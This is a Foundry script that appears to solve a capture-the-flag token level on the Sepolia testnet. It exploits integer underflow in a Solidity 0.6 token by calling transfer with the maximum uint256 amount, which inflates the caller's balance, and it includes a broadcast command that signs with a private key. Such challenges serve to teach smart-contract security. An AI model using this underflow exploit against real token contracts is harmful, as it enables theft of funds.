// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level5Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

contract Level5Solution is Script {
    Token public token = Token(0xfb01312ac6B170e7a6863F9B25EBd55712Cb5dB7);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address owner = 0x1234567890123456789012345678901234567890;
        console.log("Owner ballance:", token.balanceOf(owner));
        // overflow the balance of the owner becase of old solidity version
        token.transfer(owner, type(uint256).max);
        console.log("Owner ballance after transfer:", token.balanceOf(owner));

        vm.stopBroadcast();
    }
}
// forge script script/Level5Solution.s.sol:Level5Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
